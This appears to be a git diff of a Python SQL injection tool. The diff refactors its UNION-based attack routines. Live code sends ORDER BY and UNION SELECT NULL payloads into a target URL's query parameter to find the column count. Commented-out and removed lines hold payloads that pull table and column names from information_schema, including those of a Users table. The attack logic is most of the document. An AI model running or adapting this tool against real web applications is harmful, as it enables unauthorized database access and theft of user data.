@@ -12,21 +12,39 @@ from urllib.parse import urlparse
 import re
 from bs4 import BeautifulSoup
 
-def generate_union_select_payload(number):
-        payloads = [
-                    "' UNION SELECT 'MARKER_A'-- -",
-                    "' UNION SELECT 'MARKER_A', 'MARKER_B'-- -",
-                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C'-- -",
-                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D'-- -",
-                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E'-- -",
-                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F'-- -",
-                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G'-- -",
-                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G', 'MARKER_H'-- -",
-                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G', 'MARKER_H', 'MARKER_I'-- -",
-                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G', 'MARKER_H', 'MARKER_I', 'MARKER_J'-- -"
-                ]
-        return payloads[number - 1]
+# def generate_union_select_payload(number):
+#         payloads = [
+#                     "' UNION SELECT 'MARKER_A'-- -",
+#                     "' UNION SELECT 'MARKER_A', 'MARKER_B'-- -",
+#                     "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C'-- -",
+#                     "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D'-- -",
+#                     "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E'-- -",
+#                     "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F'-- -",
+#                     "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G'-- -",
+#                     "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G', 'MARKER_H'-- -",
+#                     "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G', 'MARKER_H', 'MARKER_I'-- -",
+#                     "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G', 'MARKER_H', 'MARKER_I', 'MARKER_J'-- -"
+#                 ]
+#         return payloads[number - 1]
 
+def generate_union_select_payload(number):
+    # chars = "ABCDEFGHIJ"
+    buffer = None
+    base_payload = "' UNION SELECT "
+    marker = "NULL"
+    end_payload = "-- -"
+    
+    if (number < 1):
+        return None
+    buffer = base_payload
+    for i in range (0, number):
+        buffer += marker
+        if i < number - 1:
+            buffer += ","
+    buffer += end_payload
+    return (buffer)
+    
+    
 def generate_marker_to_find(number):
         base = "ABCDEFGHIJ"
         chars = set()
@@ -37,14 +55,6 @@ def generate_marker_to_find(number):
         chars = sorted(chars)
         return chars   
 
-def perform_request(link):
-    try:
-        response = requests.get(link)
-        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx and 5xx)
-        return response
-    except requests.exceptions.RequestException as e:
-        print(f"{colored('Failed to request ', RED)} {colored(link, BRIGHT_RED, styles=BOLD)}: {e}")
-        return None
 
 def get_injection(vuln_links):
     
@@ -53,7 +63,7 @@ def get_injection(vuln_links):
             identified_db, link, query_params, success = vuln_link.get_infos()
             parsed_url = urlparse(link)
             base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
-            print(f"[{colored(link, RED)}]]")
+            # print(f"[{colored(link, RED)}]]")
             
             # response = perform_request(link)
             # response.encoding = "utf-8"
@@ -66,99 +76,145 @@ def get_injection(vuln_links):
             print(f"{colored('ERROR INJECTION : ', RED, styles=UNDERLINE)}")
 
 
-def get_union_based_injection(query_params, base_url):
-        columns = 0
-        #! SEARCH FOR NUM OF COLUMNS
-        for i in range(0, 10):
-            payload = f"' ORDER BY {i}-- -"
-            
+def get_union_text_response(response):
+    texts = set()
+    
+    soup = BeautifulSoup(response.text, "html.parser")
+    extracted = soup.find_all(string=True)
+    
+    for text in extracted:
+        texts.add(text)
+    return texts
+    
+def perform_request(link):
+    try:
+        response = requests.get(link)
+        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx and 5xx)
+        return response
+    except requests.exceptions.RequestException as e:
+        print(f"{colored('Failed to request ', RED)} {colored(link, BRIGHT_RED, styles=BOLD)}: {e}")
+        return None
+
+
+def get_union_columns_size(query_params, base_url):
+    columns = 0
+    #? GETTING NUMBERS OF COLUMNS
+    
+    #! ' ORDER BY 2-- -
+    for i in range(0, 60):
+        payload = f"' ORDER BY {i}-- -"
+        
+        params = query_params.copy() if isinstance(query_params, dict) else {}
+        
+        param_name = list(params.keys())[0] if params else query_params
+        params[param_name] = payload
+        
+        response = requests.get(base_url, params=params)
+        if "Unknown column" in response.text and i != 0:
+            columns = i - 1
+            break
+    
+    #! ' UNION SELECT NULL,NULL -- -
+    if columns == 0:
+        for i in range(1,60):
+            payload = generate_union_select_payload(i)
+
             params = query_params.copy() if isinstance(query_params, dict) else {}
             
             param_name = list(params.keys())[0] if params else query_params
             params[param_name] = payload
             
             response = requests.get(base_url, params=params)
-            if "Unknown column" in response.text and i != 0:
-                columns = i - 1
+            
+            if "expects" not in response.text:
+                columns = i
                 break
         
+    return columns
+
+def get_union_based_injection(query_params, base_url):
+        
+        
+        #! SEARCH FOR NUM OF COLUMNS
+        columns = get_union_columns_size(query_params, base_url)
         print(f"columns find {colored(str(columns), GREEN, styles=BOLD)}")
         if columns < 2:
             return None
         
-        #! INJECTING PARAMETERS TO FIND CATEGORY
-        payload = generate_union_select_payload(columns)
-        params = query_params.copy() if isinstance(query_params, dict) else {}
-        param_name = list(params.keys())[0] if params else query_params
-        params[param_name] = payload
+        # #! INJECTING PARAMETERS TO FIND CATEGORY
+        # payload = generate_union_select_payload(columns)
+        # print(f"{colored(payload, RED)}")
+        # params = query_params.copy() if isinstance(query_params, dict) else {}
+        # param_name = list(params.keys())[0] if params else query_params
+        # params[param_name] = payload
         
-        response = requests.get(base_url, params=params)
-        # print(f"{colored(response.url, RED)}")
+        # response = requests.get(base_url, params=params)
         
-        marker_to_find = generate_marker_to_find(columns)
+        # marker_to_find = generate_marker_to_find(columns)
 
-        #! FINDING MARKER POS IN PAGE
-        soup = BeautifulSoup(response.text, "html.parser")
-        class_elements = soup.find_all(string=True)
-        
-        for element in class_elements:            
-            if element in marker_to_find:
-                print(f"[{colored(element, GREEN)}]")
-            elif element == '\n':
-                pass
-            else:
-                print(f"[{colored(element, YELLOW)}]")
+        # # #! FINDING MARKER POS IN PAGE
+        # # texts = get_union_text_response(response)
         
         
-        # print(f"Extracted values: {marker_to_find}")
-        # print(response.url)
         
-        #! FINDING TABLE NAME 
-        payload = "' UNION SELECT GROUP_CONCAT(table_name), 2, 3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -"
-        print(f"{colored(payload, GREEN)}")
-        params = query_params.copy() if isinstance(query_params, dict) else {}
-        
-        param_name = list(params.keys())[0] if params else query_params
-        params[param_name] = payload
-        response = requests.get(base_url, params=params)
-        
-        soup = BeautifulSoup(response.text, "html.parser")
-        class_elements = soup.find_all(string=True)
-        
-        for element in class_elements:            
-            if element in marker_to_find:
-                print(f"[{colored(element, GREEN)}]")
-            elif element == '\n':
-                pass
-            else:
-                print(f"[{colored(element, RED)}]")
-        
-        #! FINDING COLUMN_NAME
-        payload = "' UNION SELECT GROUP_CONCAT(column_name),2 , 3 FROM information_schema.columns WHERE table_name='Users'-- -"
-        print(f"{colored(payload, GREEN)}")
-        params = query_params.copy() if isinstance(query_params, dict) else {}
-        
-        param_name = list(params.keys())[0] if params else query_params
-        params[param_name] = payload
-        response = requests.get(base_url, params=params)
-        
-        soup = BeautifulSoup(response.text, "html.parser")
-        class_elements = soup.find_all(string=True)
-        
-        for element in class_elements:            
-            if element in marker_to_find:
-                print(f"[{colored(element, GREEN)}]")
-            elif element == '\n':
-                pass
-            else:
-                print(f"[{colored(element, MAGENTA)}]")
-        
-        print()
+        # # for element in class_elements:            
+        # #     if element in marker_to_find:
+        # #         print(f"[{colored(element, GREEN)}]")
+        # #     elif element == '\n':
+        # #         pass
+        # #     else:
+        # #         print(f"[{colored(element, YELLOW)}]")
         
         
-        # print(f"{colored(response.text, GREEN)}")
+        # # print(f"Extracted values: {marker_to_find}")
+        # # print(response.url)
         
-        # print(response.text)
-        print(f"{colored(response.url, RED)}")
-        # # print(f"{colored(response.url, RED, styles=BOLD)}")
+        # #! FINDING TABLE NAME 
+        # payload = "' UNION SELECT GROUP_CONCAT(table_name), 2, 3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -"
+        # print(f"{colored(payload, GREEN)}")
+        # params = query_params.copy() if isinstance(query_params, dict) else {}
+        
+        # param_name = list(params.keys())[0] if params else query_params
+        # params[param_name] = payload
+        # response = requests.get(base_url, params=params)
+        
+        # soup = BeautifulSoup(response.text, "html.parser")
+        # class_elements = soup.find_all(string=True)
+        
+        # for element in class_elements:            
+        #     if element in marker_to_find:
+        #         print(f"[{colored(element, GREEN)}]")
+        #     elif element == '\n':
+        #         pass
+        #     else:
+        #         print(f"[{colored(element, RED)}]")
+        
+        # #! FINDING COLUMN_NAME
+        # payload = "' UNION SELECT GROUP_CONCAT(column_name),2 , 3 FROM information_schema.columns WHERE table_name='Users'-- -"
+        # print(f"{colored(payload, GREEN)}")
+        # params = query_params.copy() if isinstance(query_params, dict) else {}
+        
+        # param_name = list(params.keys())[0] if params else query_params
+        # params[param_name] = payload
+        # response = requests.get(base_url, params=params)
+        
+        # soup = BeautifulSoup(response.text, "html.parser")
+        # class_elements = soup.find_all(string=True)
+        
+        # for element in class_elements:            
+        #     if element in marker_to_find:
+        #         print(f"[{colored(element, GREEN)}]")
+        #     elif element == '\n':
+        #         pass
+        #     else:
+        #         print(f"[{colored(element, MAGENTA)}]")
+        
+        # print()
+        
+        
+        # # print(f"{colored(response.text, GREEN)}")
+        
+        # # print(response.text)
+        # print(f"{colored(response.url, RED)}")
+        # # # print(f"{colored(response.url, RED, styles=BOLD)}")
 
